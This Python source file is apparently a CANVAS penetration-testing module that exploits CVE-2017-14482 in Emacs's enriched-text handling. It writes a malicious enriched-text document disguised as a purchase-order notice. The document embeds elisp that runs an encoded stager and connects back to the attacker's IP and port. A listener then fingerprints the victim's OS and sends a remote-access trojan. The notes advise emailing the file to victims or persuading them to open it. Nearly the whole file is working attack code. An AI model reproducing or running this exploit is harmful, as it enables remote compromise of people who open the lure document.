
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2016
#http://www.immunityinc.com/products/canvas/index.html for more information

import sys
import time
import socket

#covers both angles
if "." not in sys.path: sys.path.append(".")

# import libs.spkproxy as spkproxy


from tcpexploit import tcpexploit
from libs.canvasos import canvasos
from exploitutils import *
from ExploitTypes.CommandLineExecuter import CommandExploit

from MOSDEF.cc import cc_main, threadsafe_cc_main
from canvasengine import canvas_root_directory
import canvasengine

import random
import string
import struct

import timeoutsocket



NAME                           = "Emacs Enriched Mime-type Handler Arbitrary ELISP Execution"
DESCRIPTION                    = "Emacs Enriched Mime-type Handler Arbitrary ELISP Execution"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "https://www.gnu.org/software/emacs/"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2017-14482"
DOCUMENTATION["CVE URL"]       = "https://access.redhat.com/security/cve/CVE-2017-14482"
DOCUMENTATION["References"]    = ["https://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-25&id=9ad0fcc54442a9a01d41be19880250783426db70",
                                  "https://access.redhat.com/security/cve/CVE-2017-14482"]

DOCUMENTATION['Notes']         = """
Either email this to someone using the GNUS email client or convince
them to open it like a normal file. You will eventually get a MOSDEF
shell.

WARNING: For the CEU release it will likely lock the editor.

Tested Operating Systems:
* Emacs 24.5.1 - Ubuntu 16.04 LTS
*

"""

VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Clientside"
PROPERTY['ARCH']               = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION']            = [ "All" ]

template = """content-type: text/enriched

TEMPLATE_TEXT

<x-display>
<param>
(height
;; arbitrary elisp here
(let 	     ((packaged-font "STAGER_BINARY"))
	    (funcall (car (read-from-string packaged-font)) "CALLBACK_IP_ADDRESS" CALLBACK_PORT))

;; end of arbitrary elisp
)
</param>
</x-display>
"""
# template = """content-type: text/enriched

# TEMPLATE_TEXT

# <x-display>
# <param>
# (height
# ;; arbitrary elisp here
# (let 	     ((packaged-font STAGER_BINARY))
# 	    (funcall (car (read-from-string packaged-font)) "CALLBACK_IP_ADDRESS" CALLBACK_PORT))

# ;; end of arbitrary elisp
# )
# </param>
# </x-display>
# """


class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)
        self.autoFind = False

    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

    def getargs(self):
        self.getarg("file_path")

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def random_string(self, length=None, extras=[]):
        if not length:
            length = random.randint(1, 100)

        dictionary = list(string.letters) + list(string.digits) + extras

        return "".join([random.choice(dictionary) for i in range(0, length)])

    def load_mosdef(self):
        succeeded = False
        listener = None
        stager_port = None
        tries = 0

        port = 5555
        final_port = None

        # while not succeeded or tries < 5:
        for port in range(port, port + 100):
            stager_port = port

            try:
                listener = self.gettcplistener(stager_port, listenhost=self.callback.ip)
            except:
                pass
            else:
                if listener:
                    succeeded = True
                    listener.set_timeout(20)

            if succeeded:
                final_port = stager_port
                break


        if not succeeded:
            logging.error("Unable to start stager listener")
            return None

        logging.info("Intermediate shell server on %s:%d" % (self.callback.ip, final_port))
        logging.info("Dropping malicious enriched text file:")

        document = self.generate_document(port=final_port)
        doc_path = os.path.join(canvas_root_directory, "emacs_cs_%d" % random.randint(0, 10000))

        logging.info(doc_path)

        with open(doc_path, "wb") as handle:
            handle.write(document)


        succeeded = False


        while not succeeded and self.state != "HALT":
            handle, address = None, None

            try:
                (handle, address) = listener.accept()
            except timeoutsocket.Timeout, msg:
                continue
            except Exception as e:
                logging.error("Exception: " + str(e))
                logging.error("No python stager connectback")
                break

            if handle is None:
                continue

            logging.info("Got connection! Grabbing version string...")
            version_string_len = None

            try:
                version_string_len = struct.unpack("<L", handle.recv(4))[0]
            except timeoutsocket.Timeout, msg:
                logging.warning("Reading version string length timed out")
                continue
            except Exception as e:
                logging.error("During version-string-length read...")
                logging.error("Exception: " + str(e))
                handle.close()
                continue

            logging.info("Version string is %x bytes long" % version_string_len)
            # What happens when we can't determine the uname-like
            # command for the target os
            if version_string_len == 0:
                logging.info("Unable to grab version information from target, aborting")
                handle.close()

            i = 0
            version_data = []
            version_string = None

            try:
                while i < version_string_len:
                    new_data = handle.recv(version_string_len - i)
                    version_data.append(new_data)
                    i += len(new_data)
            except timeoutsocket.Timeout, msg:
                logging.warning("Receiving version-string timed out")
                continue
            except Exception as e:
                logging.error("During version-string read...")
                logging.error("Exception: " + str(e))
                handle.close()
                continue

            version_string = "".join(version_data)
            logging.info("Got os version string:" + version_string)

            cos = canvasos()
            cos.load_uname(version_string)

            trojan = self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=cos, universal=True)

            logging.info("Sending trojan of size: %d" % len(self.mosdeftrojan))

            length_str = struct.pack("<L", len(self.mosdeftrojan))

            logging.info("Length of length string:%d" % len(length_str))

            try:
                handle.sendall(length_str)
                handle.sendall(self.mosdeftrojan)
                handle.close()
            except timeoutsocket.Timeout, msg:
                logging.warning("Receiving version-string timed out")
                continue
            except Exception as e:
                logging.error("During version-string read...")
                logging.error("Exception: " + str(e))
                handle.close()
                continue

            logging.info("Sent native-MOSDEF loader")

    def randomize_stager(self, stager, overridden=[]):
        replacer_keys = set()
        prev_strings = set()
        allowed = ["-", "/"]

        state = 0

        current = []

        for i in stager:
            if state == 0:
                if i == "{":
                    current.append(i)
                    state = 1
            elif state == 1:
                if i == "}":
                    current.append(i)
                    replacer_keys.add("".join(current))
                    state = 0
                    current = []
                elif i not in allowed and not i.isalnum():
                    state = 0
                    current = []
                else:
                    current.append(i)

        for key in replacer_keys:
            if key in overridden:
                pass
            else:
                value = self.random_string()

                while value in prev_strings:
                    value = self.random_string()

                stager = stager.replace(key, value)

        return stager

    def generate_document(self, text="Your purchase order succeeded", port=None):
        global template
        with open(os.path.join(os.path.dirname(__file__), "Resources", "encoded_stager.bin"), "rb") as handle:
            return template.replace("TEMPLATE_TEXT", text).replace("CALLBACK_IP_ADDRESS", self.callback.ip).replace("CALLBACK_PORT", str(port)).replace("STAGER_BINARY", self.randomize_stager(handle.read()))

    def run(self):
        # self.getargs()

        self.host = self.target.interface
        self.setInfo("%s (in progress)" % (NAME))

        self.load_mosdef()
        logging.info("Done")


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
